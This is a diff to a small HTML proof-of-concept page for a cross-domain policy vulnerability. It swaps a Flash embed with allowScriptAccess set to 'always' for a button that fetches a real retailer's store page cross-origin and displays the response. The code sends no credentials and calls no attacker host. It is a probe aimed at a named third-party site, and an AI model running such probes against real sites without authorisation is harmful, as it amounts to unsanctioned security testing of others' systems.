@@ -1,13 +1,24 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PoC for Cross-Domain Policy Vulnerability</title>
+    <title>Cross-Domain Policy PoC</title>
+    <script>
+        function makeRequest() {
+            fetch('https://www.oneplus.in/store') // Replace with the desired endpoint
+                .then(response => response.text())
+                .then(data => {
+                    console.log("Data received:", data);
+                    document.getElementById("output").innerText = data;
+                })
+                .catch(error => {
+                    console.error("Error fetching data:", error);
+                });
+        }
+    </script>
 </head>
 <body>
     <h1>Cross-Domain Policy PoC</h1>
-    <object type="application/x-shockwave-flash" data="your_flash_file.swf" width="800" height="600">
-        <param name="movie" value="your_flash_file.swf" />
-        <param name="allowScriptAccess" value="always" />
-    </object>
+    <button onclick="makeRequest()">Make Request</button>
+    <pre id="output"></pre>
 </body>
 </html>
